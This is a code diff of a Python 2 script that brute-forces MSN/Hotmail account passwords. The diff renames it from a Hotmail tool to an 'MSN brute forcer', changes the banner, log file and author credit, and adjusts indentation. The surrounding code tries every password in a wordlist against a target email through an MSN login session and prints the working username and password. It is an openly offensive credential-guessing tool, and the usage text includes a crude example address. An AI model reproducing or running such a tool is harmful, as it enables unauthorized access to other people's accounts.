@@ -7,28 +7,22 @@
 
 import sys, time, msnp
 
-__Author__ = "Gunslinger_"
+__Author__ = "Gunslinger_ - Modified by Leleobhz"
 __Version__  = "1.0"
 __Date__   = "Mon, 22 Feb 2010 13:13:43 +0700 "
-log = "hotmailbrute.log"
+log = "msnbrute.log"
 file = open(log, "a")
 counter = 0
 face = '''
- _           _                   _ _   _      __
-| |__   ___ | |_ _ __ ___   __ _(_) | | |__  / _|
-| '_ \ / _ \| __| '_ ` _ \ / _` | | | | '_ \| |_
-| | | | (_) | |_| | | | | | (_| | | | | |_) |  _|
-|_| |_|\___/ \__|_| |_| |_|\__,_|_|_| |_.__/|_|
-
- Hotmail brute forcer
+ MSN brute forcer
  programmer   : %s
  version      : %s
  date release : %s
  ''' % (__Author__, __Version__, __Date__)
 
 help = '''
-Usage : ./hotmailbf.py -u [email] -w [wordlist]
-Example : ./hotmailbf.py -u suckthedick@hotmail.com -w wordlist.txt
+Usage : ./msnbf.py -u [email] -w [wordlist]
+Example : ./msnbf.py -u suckthedick@hotmail.com -w wordlist.txt
 '''
 
 for arg in sys.argv:
@@ -85,7 +79,6 @@ def main(password):
   sys.stdout.flush()
   file.write("[-] Trying : %s \n" % (str(password)))
   try:
-    dispatch_server = ('messenger.hotmail.com', 1863)
     msntmp = msnp.Session(msnparse())
     msntmp.login(email, password)
     print "[+] W00t w00t !!!\n[+] Username : [%s]\n[+] Password : [%s]\n[+] Status : Valid!" % (email, password)
@@ -94,7 +87,7 @@ def main(password):
   except msnp.error.HttpError:
     exit
   except msnnologin:
-      exit
+    exit
   except KeyboardInterrupt:
     print "\n[-] Aborting...\n"
     file.write("\n[-] Aborting...\n")
